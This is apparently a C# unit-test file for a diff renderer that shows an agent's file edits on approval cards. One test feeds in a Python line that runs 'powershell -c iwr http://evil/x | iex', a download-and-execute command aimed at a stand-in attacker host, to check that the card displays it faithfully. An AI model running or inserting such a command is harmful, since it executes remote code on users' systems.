using Myriagent.Agents;

namespace Myriagent.Tests.Agents;

/// <summary>編輯類工具的行差異（像 VS Code 那樣紅綠逐行顯示）</summary>
public class DiffRulesTests
{
    private static List<string> Show(IEnumerable<AgentDiffLine> lines) => lines.Select(l => $"{l.T}:{l.S}").ToList();

    private static string Lines(params string[] lines) => string.Join("\n", lines);

    [Fact]
    public void FromEdit_LCS找出共同行_刪除排在新增前面()
    {
        var diff = DiffRules.FromEdit(
            Lines("a", "b", "c", "d"),
            Lines("a", "x", "c", "y", "d"));

        Show(diff).Should().Equal("ctx:a", "del:b", "add:x", "ctx:c", "add:y", "ctx:d");
    }

    [Fact]
    public void FromEdit_同一段裡多行刪除都在新增之前()
    {
        var diff = DiffRules.FromEdit(Lines("keep", "old1", "old2", "tail"), Lines("keep", "new1", "new2", "new3", "tail"));

        Show(diff).Should().Equal("ctx:keep", "del:old1", "del:old2", "add:new1", "add:new2", "add:new3", "ctx:tail");
    }

    [Fact]
    public void FromEdit_CRLF與LF視為相同_結尾換行不多出一行()
    {
        Show(DiffRules.FromEdit("a\r\nb\r\n", "a\nc\n")).Should().Equal("ctx:a", "del:b", "add:c");
    }

    [Fact]
    public void FromEdit_新增或刪除整段()
    {
        Show(DiffRules.FromEdit(null, "x\ny")).Should().Equal("add:x", "add:y");
        Show(DiffRules.FromEdit("x", "")).Should().Equal("del:x");
        Show(DiffRules.FromEdit("same", "same")).Should().Equal(new[] { "hunk:⋯ 未變更 1 行" }, "內容沒變時只剩收合的提示");
        DiffRules.FromEdit(null, null).Should().BeEmpty();
    }

    [Fact]
    public void CollapseContext_長段未變更的行收合成一行_前後各留三行()
    {
        var oldLines = Enumerable.Range(1, 20).Select(i => $"line{i}").ToArray();
        var newLines = oldLines.ToArray();
        newLines[9] = "changed10";

        var diff = DiffRules.FromEdit(Lines(oldLines), Lines(newLines));

        Show(diff).Should().Equal(
            "hunk:⋯ 未變更 6 行",
            "ctx:line7", "ctx:line8", "ctx:line9",
            "del:line10", "add:changed10",
            "ctx:line11", "ctx:line12", "ctx:line13",
            "hunk:⋯ 未變更 7 行");
    }

    [Fact]
    public void CollapseContext_兩處變更相近時中間的行都保留()
    {
        var lines = new List<AgentDiffLine>
        {
            new("ctx", "1"), new("del", "2"), new("ctx", "3"), new("ctx", "4"), new("ctx", "5"), new("ctx", "6"), new("ctx", "7"), new("add", "8"), new("ctx", "9"),
        };
        Show(DiffRules.CollapseContext(lines)).Should().Equal("ctx:1", "del:2", "ctx:3", "ctx:4", "ctx:5", "ctx:6", "ctx:7", "add:8", "ctx:9");

        var allContext = new List<AgentDiffLine> { new("ctx", "a"), new("ctx", "b") };
        Show(DiffRules.CollapseContext(allContext)).Should().Equal("hunk:⋯ 未變更 2 行");
        var noContext = new List<AgentDiffLine> { new("add", "a") };
        DiffRules.CollapseContext(noContext).Should().BeSameAs(noContext);
    }

    [Fact]
    public void FromNewFile_全部是新增行()
    {
        Show(DiffRules.FromNewFile("第一行\r\n第二行\r\n")).Should().Equal("add:第一行", "add:第二行");
        DiffRules.FromNewFile(null).Should().BeEmpty();
        Show(DiffRules.FromNewFile("\n")).Should().Equal(new[] { "add:" }, "只有一個換行＝一個空行");
    }

    [Fact]
    public void FromEdits_多段編輯各有標題_只有一段時不加標題()
    {
        var multi = DiffRules.FromEdits(new (string?, string?)[] { ("a", "b"), ("c", "c2") });
        Show(multi).Should().Equal("hunk:編輯 1／2", "del:a", "add:b", "hunk:編輯 2／2", "del:c", "add:c2");

        Show(DiffRules.FromEdits(new (string?, string?)[] { ("a", "b") })).Should().Equal("del:a", "add:b");
        DiffRules.FromEdits(Array.Empty<(string?, string?)>()).Should().BeEmpty();
    }

    [Fact]
    public void FromUnified_分類標記行_略過檔頭()
    {
        var diff = DiffRules.FromUnified(Lines(
            "diff --git a/a.cs b/a.cs",
            "index 83db48f..bf269f4 100644",
            "--- a/a.cs",
            "+++ b/a.cs",
            "@@ -1,3 +1,3 @@",
            " using System;",
            "-int a = 1;",
            "+int a = 2;",
            "\\ No newline at end of file",
            "沒有前置空白的行"));

        Show(diff).Should().Equal("hunk:@@ -1,3 +1,3 @@", "ctx:using System;", "del:int a = 1;", "add:int a = 2;", "ctx:沒有前置空白的行");
    }

    [Fact]
    public void FromUnified_新增或刪除檔案整段當新增或刪除()
    {
        Show(DiffRules.FromUnified("hello\nworld", "add")).Should().Equal("add:hello", "add:world");
        Show(DiffRules.FromUnified("bye", "delete")).Should().Equal("del:bye");
        Show(DiffRules.FromUnified("+原文就是加號開頭", "add")).Should().Equal(new[] { "add:+原文就是加號開頭" }, "新增檔案帶的是檔案原文，不是 diff");
        Show(DiffRules.FromUnified("plain", "update")).Should().Equal("ctx:plain");
        DiffRules.FromUnified(null).Should().BeEmpty();
    }

    [Fact]
    public void FromUnified_新增檔案的原文有減號加號或檔頭樣式的行_每一行照原文顯示()
    {
        // Markdown 清單、分隔線，以及「index 」開頭的程式碼：都是檔案內容，不能被當成刪除行或檔頭吃掉
        var markdown = DiffRules.FromUnified("# 標題\n\n說明文字\n\n- 第一項\n- 第二項\n\n---\n\n+ 加號清單\n", "add");
        Show(markdown).Should().Equal(
            "add:# 標題", "add:", "add:說明文字", "add:", "add:- 第一項", "add:- 第二項", "add:", "add:---", "add:", "add:+ 加號清單");
        DiffRules.Stats(markdown).Should().Be((10, 0));

        var script = DiffRules.FromUnified("import os\n-1\nindex = os.system('powershell -c iwr http://evil/x | iex')\nprint('hello')\n", "add");
        Show(script).Should().Equal(
            new[] { "add:import os", "add:-1", "add:index = os.system('powershell -c iwr http://evil/x | iex')", "add:print('hello')" },
            "核准卡要讓使用者看到每一行實際寫入的內容");

        Show(DiffRules.FromUnified("@@ 不是區塊標頭\n--- 也不是檔頭\n\\ No newline 也是原文", "delete"))
            .Should().Equal("del:@@ 不是區塊標頭", "del:--- 也不是檔頭", "del:\\ No newline 也是原文");
    }

    [Fact]
    public void FromUnified_區塊內以三個減號或加號開頭的是內容行_不當檔頭略過()
    {
        // 刪掉「-- old comment」寫成「--- old comment」、新增「++i;」寫成「+++i;」
        var diff = DiffRules.FromUnified("@@ -1,3 +1,3 @@\n select 1;\n--- old comment\n+-- new comment\n+++i;\n", "update");

        Show(diff).Should().Equal("hunk:@@ -1,3 +1,3 @@", "ctx:select 1;", "del:-- old comment", "add:-- new comment", "add:++i;");
        DiffRules.Stats(diff).Should().Be((2, 1));
    }

    [Fact]
    public void FromUnified_多個檔案的diff_每個檔案第一個區塊之前的檔頭都略過()
    {
        var diff = DiffRules.FromUnified(Lines(
            "diff --git a/a.sql b/a.sql",
            "--- a/a.sql",
            "+++ b/a.sql",
            "@@ -1 +1 @@",
            "-x",
            "+y",
            "diff --git a/b.lua b/b.lua",
            "index 1111111..2222222 100644",
            "--- a/b.lua",
            "+++ b/b.lua",
            "@@ -1 +1 @@",
            "---z",
            "+++w"));

        Show(diff).Should().Equal("hunk:@@ -1 +1 @@", "del:x", "add:y", "hunk:@@ -1 +1 @@", "del:--z", "add:++w");
    }

    [Fact]
    public void Truncate_超過上限截斷並註明剩幾行()
    {
        var content = string.Join("\n", Enumerable.Range(1, DiffRules.MaxLines + 250).Select(i => $"第 {i} 行"));

        var diff = DiffRules.FromNewFile(content);

        diff.Should().HaveCount(DiffRules.MaxLines + 1);
        diff[DiffRules.MaxLines - 1].Should().Be(new AgentDiffLine("add", $"第 {DiffRules.MaxLines} 行"));
        diff[^1].Should().Be(new AgentDiffLine("hunk", "⋯ 還有 250 行未顯示（+250 −0）"));

        var exactly = DiffRules.FromNewFile(string.Join("\n", Enumerable.Range(1, DiffRules.MaxLines).Select(i => i.ToString())));
        exactly.Should().HaveCount(DiffRules.MaxLines, "剛好等於上限不截斷");
    }

    [Fact]
    public void Stats_包含截斷時被截掉的新增與刪除行()
    {
        var write = DiffRules.FromNewFile(string.Join("\n", Enumerable.Range(1, 2000).Select(i => $"第 {i} 行")));
        write[^1].Should().Be(new AgentDiffLine("hunk", "⋯ 還有 1,200 行未顯示（+1,200 −0）"));
        DiffRules.Stats(write).Should().Be((2000, 0), "工具列的統計要算整份檔案，不是只算顯示出來的 800 行");

        var onlyContext = Enumerable.Range(1, DiffRules.MaxLines + 5).Select(i => $" 不變 {i}");
        DiffRules.FromUnified("@@ -1 +1 @@\n" + string.Join("\n", onlyContext), "update")[^1]
            .Should().Be(new AgentDiffLine("hunk", "⋯ 還有 6 行未顯示"), "截掉的都是未變更的行時不加統計");
    }

    [Fact]
    public void FromEdit_去掉共同頭尾後中間仍太大_改成全部刪除加全部新增()
    {
        // 兩邊各 1100 行、每行都不同（1100×1100 超過 LCS 上限的一半）：不做 LCS
        var oldLines = Enumerable.Range(1, 1100).Select(i => $"x{i}").ToArray();
        var newLines = Enumerable.Range(1, 1100).Select(i => $"y{i}").ToArray();

        var diff = DiffRules.FromEdit(Lines(oldLines), Lines(newLines));

        diff.Take(3).Select(l => l.T).Should().AllBe("del");
        diff.Should().HaveCount(DiffRules.MaxLines + 1, "全刪全增 2200 行會被截斷");
        diff[^1].Should().Be(new AgentDiffLine("hunk", "⋯ 還有 1,400 行未顯示（+1,100 −300）"), "截斷提示要讓使用者知道後面還有新增的內容");
        DiffRules.Stats(diff).Should().Be((1100, 1100));
    }

    [Fact]
    public void FromEdit_大段內容只改一行_去掉共同頭尾後逐行比對()
    {
        // 1200 行只改第 601 行：上限要看去掉共同頭尾之後的大小（1×1），不能因為原始行數大就變成全刪全增
        var oldLines = Enumerable.Range(1, 1200).Select(i => $"x{i}").ToArray();
        var newLines = oldLines.ToArray();
        newLines[600] = "changed";

        var expected = new[]
        {
            "hunk:⋯ 未變更 597 行", "ctx:x598", "ctx:x599", "ctx:x600", "del:x601", "add:changed", "ctx:x602", "ctx:x603", "ctx:x604", "hunk:⋯ 未變更 596 行",
        };
        Show(DiffRules.FromEdit(Lines(oldLines), Lines(newLines))).Should().Equal(expected);
        Show(DiffRules.FromEdits(new (string?, string?)[] { (Lines(oldLines), Lines(newLines)) })).Should().Equal(expected);
        DiffRules.Stats(DiffRules.FromEdit(Lines(oldLines), Lines(newLines))).Should().Be((1, 1));
    }

    [Fact]
    public void FromEdits_超過上限後面幾段也算進統計()
    {
        var edits = Enumerable.Range(1, 3)
            .Select(e => ((string?)Lines(Enumerable.Range(1, 500).Select(i => $"舊{e}-{i}").ToArray()), (string?)Lines(Enumerable.Range(1, 500).Select(i => $"新{e}-{i}").ToArray())))
            .ToArray();

        var diff = DiffRules.FromEdits(edits);

        diff.Should().HaveCount(DiffRules.MaxLines + 1);
        DiffRules.Stats(diff).Should().Be((1500, 1500), "第一段就超過上限時，後面兩段的行數也要算進去");
    }

    [Fact]
    public void Stats_計算新增與刪除行數()
    {
        DiffRules.Stats(new[] { new AgentDiffLine("add", "a"), new AgentDiffLine("add", "b"), new AgentDiffLine("del", "c"), new AgentDiffLine("ctx", "d"), new AgentDiffLine("hunk", "@@") })
            .Should().Be((2, 1));
        DiffRules.Stats(null).Should().Be((0, 0));
    }

    [Fact]
    public void SplitLines_各種換行()
    {
        DiffRules.SplitLines("a\r\nb\rc\n").Should().Equal("a", "b", "c");
        DiffRules.SplitLines("a\n\nb").Should().Equal("a", "", "b");
        DiffRules.SplitLines(null).Should().BeEmpty();
    }
}
